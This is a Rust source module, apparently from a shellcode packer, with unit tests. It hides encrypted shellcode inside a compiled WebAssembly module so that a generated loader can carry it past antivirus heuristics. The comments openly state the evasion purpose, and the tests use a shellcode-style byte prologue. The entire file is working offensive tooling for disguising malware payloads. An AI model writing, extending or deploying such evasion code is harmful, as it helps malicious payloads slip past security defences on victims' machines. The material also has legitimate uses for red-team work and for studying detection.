//! WebAssembly (WAT) payload wrapping for the `ntWat` template.
//!
//! Implements the shellcode-evasion technique described by Balwurk: instead of
//! embedding encrypted shellcode directly (which raises entropy and trips AV
//! heuristics), the payload is wrapped in a WebAssembly text-format (WAT)
//! module, compiled to a `.wasm` binary at pack time, and embedded as a
//! data section. The generated loader reads that data section back out at
//! runtime and decrypts it with the normal encryption pipeline.
//!
//! The WAT source is human-readable text, so the embedded payload looks like a
//! legitimate wasm module rather than high-entropy ciphertext. The `wat` crate
//! (pure Rust) is used only at pack time to compile the text to a binary; the
//! generated loader needs no wasm runtime dependency at all.

use crate::shellcode_reader::read_shellcode;
use crate::utils::write_to_file;
use anyhow::{Context, Result};
use std::path::Path;

/// Build a WAT module that stores `payload` in an active data segment at
/// offset 0 and exports `len` / `get` helpers (matching the article's PoC).
///
/// Each byte is emitted as a `\xx` hex escape, the canonical WAT string
/// encoding, so arbitrary binary payload survives the text round-trip.
fn build_wat(payload: &[u8]) -> String {
    let data: String = payload.iter().map(|b| format!("\\{:02x}", b)).collect();
    format!(
        r#"(module
  (memory (export "mem") 1)
  (data (i32.const 0) "{data}")
  (func (export "len") (result i32)
    i32.const {len})
  (func (export "get") (param $i i32) (result i32)
    local.get $i
    i32.load8_u)
)"#,
        data = data,
        len = payload.len()
    )
}

/// Read the shellcode from `input_path`, wrap it in a WAT module, compile the
/// WAT to a `.wasm` binary, and write the binary to `export_path`.
///
/// The encrypted payload bytes are expected to already be present at
/// `input_path` (produced by the encryption stage). This keeps WAT wrapping
/// composable with the existing xor/aes/uuid encryption pipeline: encrypt
/// first, then wrap.
pub fn build_wasm_payload(input_path: &Path, export_path: &Path) -> Result<()> {
    println!("[+] Wrapping payload in a WebAssembly (WAT) module..");
    let payload = read_shellcode(input_path).context("Failed to read payload for WAT wrapping")?;
    let wat_src = build_wat(&payload);
    let wasm = wat::parse_bytes(wat_src.as_bytes())
        .context("Failed to compile WAT source to a wasm binary")?;
    write_to_file(&wasm, export_path).context("Failed to write wasm payload")?;
    println!("[+] Done wrapping payload in WebAssembly!");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_wat_embeds_all_bytes() {
        let payload: Vec<u8> = vec![0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8];
        let wat = build_wat(&payload);
        // Every byte appears as a two-digit hex escape.
        assert!(wat.contains(r"\fc"));
        assert!(wat.contains(r"\e4"));
        assert!(wat.contains("len"));
        assert!(wat.contains("get"));
    }

    #[test]
    fn test_build_wasm_payload_roundtrips() {
        let dir = std::env::temp_dir().join("rustpacker_test_wat");
        std::fs::create_dir_all(&dir).unwrap();
        let payload_path = dir.join("payload.bin");
        let wasm_path = dir.join("input.wasm");
        let payload: Vec<u8> = vec![0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0xff];
        std::fs::write(&payload_path, &payload).unwrap();

        build_wasm_payload(&payload_path, &wasm_path).unwrap();
        assert!(wasm_path.is_file());

        let wasm = std::fs::read(&wasm_path).unwrap();
        assert_eq!(&wasm[..4], b"\0asm");
        // Compile the recovered bytes back through wasmparser to confirm the
        // data section holds the original payload.
        for p in wasmparser::Parser::new(0).parse_all(&wasm) {
            let p = p.unwrap();
            if let wasmparser::Payload::DataSection(reader) = p {
                for d in reader {
                    let d = d.unwrap();
                    if matches!(d.kind, wasmparser::DataKind::Active { .. }) {
                        assert_eq!(d.data, payload);
                    }
                }
            }
        }

        std::fs::remove_dir_all(&dir).unwrap();
    }
}
